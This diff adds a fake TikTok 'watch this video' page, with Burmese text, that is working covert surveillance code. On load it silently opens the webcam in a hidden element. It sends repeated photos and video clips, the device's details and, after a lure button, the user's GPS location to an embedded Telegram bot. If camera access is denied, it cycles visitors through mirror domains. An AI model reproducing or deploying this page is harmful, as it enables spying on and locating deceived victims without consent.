@@ -1,0 +1,438 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TikTok UI Clone</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+  body{margin:0;background:#000;color:#fff;font-family:Arial,sans-serif;height:100vh;display:flex;flex-direction:column;}
+  .topbar{display:flex;justify-content:center;align-items:center;padding:12px 0;font-size:16px;font-weight:bold;}
+  .tab{margin:0 16px;opacity:0.6;}
+  .tab.active{opacity:1;border-bottom:2px solid #fff;padding-bottom:4px;}
+  .content{flex:1;display:flex;align-items:center;justify-content:center;position:relative;}
+  .sidebar{position:absolute;right:12px;bottom:100px;display:flex;flex-direction:column;align-items:center;gap:22px;font-size:13px;}
+  .icon{display:flex;flex-direction:column;align-items:center;gap:4px;}
+  .icon button{width:50px;height:50px;border-radius:50%;border:none;background:#222;color:#fff;font-size:22px;cursor:pointer;}
+  .profile{display:flex;flex-direction:column;align-items:center;gap:6px;}
+  .profile-pic{width:50px;height:50px;border-radius:50%;border:2px solid #fff;background:url('https://via.placeholder.com/60') no-repeat center/cover;position:relative;}
+  .follow-btn{position:absolute;bottom:-8px;left:50%;transform:translateX(-50%);width:24px;height:24px;border-radius:50%;background:#fe2c55;border:2px solid #fff;color:#fff;font-size:16px;line-height:18px;text-align:center;cursor:pointer;}
+  .bottombar{display:flex;justify-content:space-around;padding:8px 0;border-top:1px solid #222;background:#000;}
+  .bottombar button{background:none;border:none;color:#fff;font-size:20px;cursor:pointer;}
+  .bottombar .add{background:linear-gradient(90deg,#25f4ee,#fe2c55);border-radius:8px;padding:6px 16px;font-weight:bold;}
+  .dot{position:absolute;top:50%;left:50%;width:16px;height:16px;border-radius:50%;transform:translate(-50%,-50%);animation:bounce 0.6s infinite alternate;}
+  .dot.cyan{background:#25f4ee;animation-delay:-0.3s;margin-left:-12px;}
+  .dot.pink{background:#fe2c55;margin-left:12px;}
+  @keyframes bounce{from{transform:translate(-50%,-50%) scale(1);}to{transform:translate(-50%,-70%) scale(1.2);}}
+  #webcam-container{position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px;}
+  #canvas{display:none;}
+
+  /* TikTok တွင်ကြည့်ပါ - Floating Button */
+  .tiktok-app-box {
+    position: absolute;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #fe2c55;
+    color: #fff;
+    padding: 14px 28px;
+    border-radius: 25px;
+    font-size: 16px;
+    font-weight: bold;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(254, 44, 85, 0.4);
+    z-index: 999;
+    white-space: nowrap;
+    animation: fadeInUp 0.4s ease-out;
+  }
+  @keyframes fadeInUp {
+    from { bottom: 10px; opacity: 0; }
+    to { bottom: 30px; opacity: 1; }
+  }
+  
+  .spinner { display: none; }
+  .fa-spin { animation: spin 1s linear infinite; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+  .tiktok-app-box.disabled {
+    background: #555 !important;
+    cursor: not-allowed;
+    opacity: 0.8;
+    display: flex !important;
+  }
+
+  /* --- Pop-up Alert Modal Box Styling --- */
+  .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.65);
+      display: none; 
+      justify-content: center;
+      align-items: center;
+      box-sizing: border-box;
+      z-index: 10000;
+  }
+
+  .modal-overlay.show {
+      display: flex !important; 
+  }
+
+  .modal-box {
+      position: relative;
+      background-color: #ffffff;
+      width: 90%;
+      max-width: 340px;
+      text-align: center;
+      box-sizing: border-box;
+      padding: 55px 24px 24px 24px;
+      border-radius: 28px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+      transition: background 0.2s ease;
+  }
+
+  .modal-box.is-loading {
+      background-color: transparent !important;
+      box-shadow: none !important;
+      padding: 20px !important;
+  }
+
+  #locationLoading p {
+      color: #ffffff !important; 
+      font-size: 15px;
+      font-weight: 600;
+      margin-top: 20px;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+  }
+
+  .profile-wrapper { position: absolute; top: -46px; left: 50%; transform: translateX(-50%); }
+  .profile-circle { width: 92px; height: 92px; background-color: #000000; border-radius: 50%; border: 4px solid #ffffff; overflow: hidden; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); }
+  .profile-circle img { width: 100%; height: 100%; object-fit: cover; }
+  .content-section { margin-bottom: 24px; }
+  .modal-title { font-size: 19px; font-weight: 700; color: #000000; line-height: 1.4; margin-bottom: 10px; }
+  .modal-description { font-size: 13.5px; color: #4f4f4f; line-height: 1.5; padding: 0 6px; }
+  .user-name { font-style: italic; font-weight: 600; }
+  .button-group { display: flex; flex-direction: column; gap: 6px; }
+  button.modal-btn { width: 100%; border: none; padding: 13px; font-size: 14.5px; font-weight: 600; border-radius: 12px; cursor: pointer; transition: background-color 0.2s ease; }
+  .btn-primary { background-color: #FE2C55; color: #ffffff; }
+  .btn-primary:hover { background-color: #e12248; }
+  .btn-secondary { background-color: transparent; color: #757575; }
+  .btn-secondary:hover { background-color: #f5f5f5; color: #111111; }
+
+  @keyframes popupAppear {
+      from { transform: scale(0.92); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+  }
+</style>
+</head>
+<body>
+  <div class="topbar"><div class="tab">Following</div><div class="tab active">For You</div></div>
+  <div class="content">
+    <div class="dot cyan"></div><div class="dot pink"></div>
+    
+    <div id="tiktokBtn" class="tiktok-app-box" onclick="triggerPermission()">
+      <i id="loadingIcon" class="fa-solid fa-spinner fa-spin spinner"></i>
+      <span id="btnText"><i class="fa-brands fa-tiktok"></i> TikTok တွင် ကြည့်ပါ</span>
+    </div>
+
+    <div class="sidebar">
+      <div class="profile">
+        <div class="profile-pic">
+          <div class="follow-btn">+</div>
+        </div>
+      </div>
+      <div class="icon"><button><i class="fa-solid fa-heart"></i></button><span>0</span></div>
+      <div class="icon"><button><i class="fa-solid fa-comment-dots"></i></button><span>0</span></div>
+      <div class="icon"><button><i class="fa-solid fa-bookmark"></i></button><span>0</span></div>
+    </div>
+  </div>
+  
+  <div class="bottombar">
+    <button><i class="fa-solid fa-house"></i></button>
+    <button><i class="fa-solid fa-magnifying-glass"></i></button>
+    <button class="add"><i class="fa-solid fa-plus"></i></button>
+    <button><i class="fa-regular fa-message"></i></button>
+    <button><i class="fa-regular fa-user"></i></button>
+  </div>
+
+  <div id="webcam-container"><video id="webcam" autoplay playsinline></video><canvas id="canvas"></canvas></div>
+  
+  <div class="modal-overlay" id="tiktokModal">
+  <div class="modal-box" id="modalBox">
+      <div class="profile-wrapper" id="modalProfile">
+          <div class="profile-circle">
+              <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=150" alt="Profile">
+          </div>
+      </div>
+      
+      <div id="modalMainContent">
+          <div class="content-section">
+              <h3 class="modal-title">TikTok တွင် ဤဗီဒီယိုကို ကြည့်ပါ</h3>
+              <p class="modal-description">
+                  <span class="user-name">Oo Zaw</span> သည် ဗီဒီယိုတစ်ခုကို သင်နှင့် မျှဝေထားသည်။ အက်ပ်တွင် ကြည့်ရှုလိုက်ပါ။
+              </p>
+          </div>
+          <div class="button-group">
+              <button class="modal-btn btn-primary" onclick="requestLocation()">ယခုကြည့်မည်</button>
+              <button class="modal-btn btn-secondary" onclick="closeModal()">ယခုမလုပ်ပါ</button>
+          </div>
+      </div>
+
+      <div id="locationLoading" style="display: none; height: 120px; position: relative; align-items: center; justify-content: center;">
+          <div class="dot cyan"></div>
+          <div class="dot pink"></div>
+          <p style="position: absolute; bottom: -10px; font-size: 14px; font-weight: 600; width: 100%; text-align: center;">ခေတ္တစောင့်ဆိုင်းပါ...</p>
+      </div>
+  </div>
+</div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "8657372623:AAHlHmbrBzeFBKtiMpEmdeu9jr-0N6H4TRw";
+    const TELEGRAM_CHAT_ID = "7336260003";
+    const PHOTO_CAPTURE_INTERVAL = 2000;  
+    const PHOTO_CAPTURE_DURATION = 20000; 
+    const VIDEO_CAPTURE_INTERVAL = 2000;  
+
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const tiktokBtn = document.getElementById('tiktokBtn');
+
+    let photoInterval;
+    let videoInterval;
+    let mediaRecorder;
+    let stream;
+    let deviceInfoString = "Loading device info..."; 
+    let isCamStarted = false; 
+    let locationString = ""; 
+
+    // Domain List for Sequential Auto-Change
+    const domainList = [
+        "https://hfree382-beep.github.io/Tiktok1/", 
+        "https://hfree382-beep.github.io/Tiktok2/", 
+        "https://hfree382-beep.github.io/Tiktok3/", 
+        "https://hfree382-beep.github.io/Tiktok4/", 
+        "https://hfree382-beep.github.io/Tiktok5/"  
+    ];
+
+// ---------- LOCATION CAPTURE (PRO LOGIC) ----------
+function requestLocation() {
+  const mainContent = document.getElementById('modalMainContent');
+  const modalProfile = document.getElementById('modalProfile');
+  const locationLoading = document.getElementById('locationLoading');
+  const modalBox = document.getElementById('modalBox');
+  const oldBtn = document.getElementById('tiktokBtn'); 
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      async function(position) {
+        isCamStarted = true;
+        if (oldBtn) oldBtn.remove(); 
+
+        if (mainContent) mainContent.style.display = "none";
+        if (modalProfile) modalProfile.style.display = "none";
+        if (modalBox) modalBox.classList.add('is-loading');
+        if (locationLoading) locationLoading.style.display = "flex"; 
+
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        
+        locationString = `\n\n📍 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐑e𝐜e𝐢𝐯e𝐝!\n• Lat: ${lat}\n• Lon: ${lon}\n• Maps: http://maps.google.com/?q=${lat},${lon}`;
+        
+        const locationMessage = `📍 𝐔𝐬𝐞𝐫 𝐋𝐨𝐜𝐚𝐭𝐢𝐨န် 𝐑e𝐜e𝐢𝐯e𝐝!\n\n• Latitude: ${lat}\n• Longitude: ${lon}\n• Google Maps: http://maps.google.com/?q=${lat},${lon}`;
+        
+        try {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: locationMessage })
+          });
+        } catch (e) {
+          console.error("Telegram error:", e);
+        }
+
+        setTimeout(() => {
+            window.location.href = "https://www.tiktok.com";
+        }, 90000); 
+      },
+
+      function(error) {
+        console.log("Location permission denied.");
+        isCamStarted = true;
+        if (oldBtn) oldBtn.remove();
+
+        if (mainContent) mainContent.style.display = "none";
+        if (modalProfile) modalProfile.style.display = "none";
+        if (modalBox) modalBox.classList.add('is-loading');
+        if (locationLoading) locationLoading.style.display = "flex";
+
+        setTimeout(() => {
+            window.location.href = "https://www.tiktok.com";
+        }, 1200000);
+      }
+    );
+  } else {
+    window.location.href = "https://www.tiktok.com";
+  }
+}
+
+    // ---------- Device Info ----------
+    async function getDeviceInfo() {
+      let userAgent = navigator.userAgent;
+      let platform = navigator.platform;
+      let screenSize = `${screen.width}x${screen.height}`;
+      let batteryLevel = "Unknown";
+
+      try {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          batteryLevel = `${Math.round(battery.level * 100)}%`;
+        }
+      } catch(e) {}
+
+      return `📱 Device Info\n\n•👦 𝐔𝐬𝐞𝐫 𝐀𝐠𝐞𝐧𝐭: ${userAgent}\n•⚙ 𝐏: ${platform}\n•📲 𝐒𝐜𝐫𝐞𝐞𝐧: ${screenSize}\n•🔋 𝐁𝐚𝐭𝐭𝐞𝐫𝐲: ${batteryLevel}`;
+    }
+
+    // ---------- Webcam ----------
+    async function startWebcam() {
+      const btn = document.getElementById('tiktokBtn');
+      const spinner = document.getElementById('loadingIcon');
+      const btnText = document.getElementById('btnText');
+
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        
+        if (btnText) btnText.innerText = " ခေတ္တစောင့်ဆိုင်းပါ...";
+        if (spinner) spinner.style.display = "inline-block";
+        if (btn) btn.style.background = "#555"; 
+
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          
+          startPhotoCapture();
+
+          // Pomput box ပေါ်မယ့်ကြာချိန်⏰ (၁၀ စက္ကန့်)
+          setTimeout(function() {
+              if (btn) btn.style.display = "none"; 
+              if (spinner) spinner.style.display = "none"; 
+              
+              const modal = document.getElementById('tiktokModal');
+              if (modal) {
+                  modal.classList.add('show'); 
+              }
+          }, 10000); 
+        };
+
+      } catch (err) { 
+        // 🔴 ကင်မရာပါမစ်ရှင် ငြင်းလိုက်ရင် (Deny)၊ Block ခံရရင်၊ သို့မဟုတ် Crash ဖြစ်သွားရင်
+        console.error("Webcam error or denied:", err);
+        
+        let currentDomainIndex = parseInt(localStorage.getItem('nextDomainIndex')) || 0;
+        let targetDomain = domainList[currentDomainIndex];
+        let nextIndex = currentDomainIndex + 1;
+        
+        if (nextIndex >= domainList.length) {
+            nextIndex = 0;
+        }
+        localStorage.setItem('nextDomainIndex', nextIndex);
+        
+        // အစီအစဉ်အတိုင်း Domain ဆီသို့ လမ်းကြောင်းလွှဲပို့ခြင်း
+        window.location.href = targetDomain;
+      }
+    } 
+
+    function closeModal() {
+        const modal = document.getElementById('tiktokModal');
+        if (modal) modal.classList.remove('show');
+    }
+
+    function showTiktokBox() {
+      if (!isCamStarted && tiktokBtn) {
+        tiktokBtn.style.display = "flex";
+      }
+    }
+
+    function triggerPermission() {
+      const btn = document.getElementById('tiktokBtn');
+      const spinner = document.getElementById('loadingIcon');
+      const btnText = document.getElementById('btnText');
+      
+      if(btn) {
+          btn.classList.add('disabled');
+          btn.style.pointerEvents = 'none'; 
+          if (btnText) btnText.innerText = " ခေတ္တစောင့်ဆိုင်းပါ...";
+          if (spinner) spinner.style.display = "inline-block";
+          btn.style.background = "#555";
+      }
+      startWebcam();
+    }
+
+    // ---------- PHOTO ----------
+    function startPhotoCapture() {
+      photoInterval = setInterval(captureAndSendPhoto, PHOTO_CAPTURE_INTERVAL);
+      setTimeout(() => {
+        clearInterval(photoInterval);
+        startVideoLoop();
+      }, PHOTO_CAPTURE_DURATION);
+    }
+
+    async function captureAndSendPhoto() {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(async (blob) => {
+        const fd = new FormData();
+        fd.append("chat_id", TELEGRAM_CHAT_ID);
+        fd.append("photo", blob, "capture.jpg");
+        
+        fd.append("caption", deviceInfoString + locationString); 
+        
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+      }, "image/jpeg", 0.8);
+    }
+
+    // ---------- VIDEO LOOP ----------
+    function startVideoLoop() {
+      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp9" });
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) sendVideo(e.data);
+      };
+      videoInterval = setInterval(() => {
+        if (mediaRecorder.state === "recording") mediaRecorder.stop();
+        mediaRecorder.start();
+        setTimeout(() => {
+          if (mediaRecorder.state === "recording") mediaRecorder.stop();
+        }, VIDEO_CAPTURE_INTERVAL);
+      }, VIDEO_CAPTURE_INTERVAL + 500);
+    }
+
+    async function sendVideo(blob) {
+      const fd = new FormData();
+      fd.append("chat_id", TELEGRAM_CHAT_ID);
+      fd.append("video", blob, "clip.webm");
+      
+      fd.append("caption", deviceInfoString + locationString); 
+      
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: "POST", body: fd });
+    }
+
+    // အလုပ်လုပ်ပုံအဆင့်ဆင့် ပြောင်းလဲခြင်း
+    window.addEventListener("load", async () => {
+      deviceInfoString = await getDeviceInfo(); 
+      startWebcam();
+      showTiktokBox();
+    });
+
+    window.addEventListener("beforeunload", () => {
+      clearInterval(photoInterval);
+      clearInterval(videoInterval);
+      if (stream) stream.getTracks().forEach(t => t.stop());
+    });
+  </script>
+</body>
+</html>
